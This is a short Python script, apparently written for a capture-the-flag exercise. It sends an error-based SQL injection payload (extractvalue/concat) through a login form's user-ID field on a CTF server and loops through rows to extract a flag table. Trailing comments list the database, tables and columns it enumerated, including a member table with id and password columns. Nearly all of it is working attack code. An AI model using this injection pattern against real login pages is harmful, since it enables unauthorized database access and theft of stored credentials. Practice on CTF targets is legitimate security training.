import requests

url ="http://ctf.segfaulthub.com:7777/sqli_2_2/login.php"

for i in range(0,50):
  query = f"select flag from flagTable_this limit {i},1"

  sql =f"normaltic' and extractvalue('1', concat(0x3a, ({query}))) and '1' = '1"

  data = {
    "UserId": sql,
    "Password": "1234",
    "Submit": "Login"
  }

  response = requests.post(url, data=data)
  print(response.text[-30:-1])



# DB명 -> sqli_2_2
# Table명 -> flagTable_this, member
# flagTable_this -> idx, flag
# member -> id, pass, name, info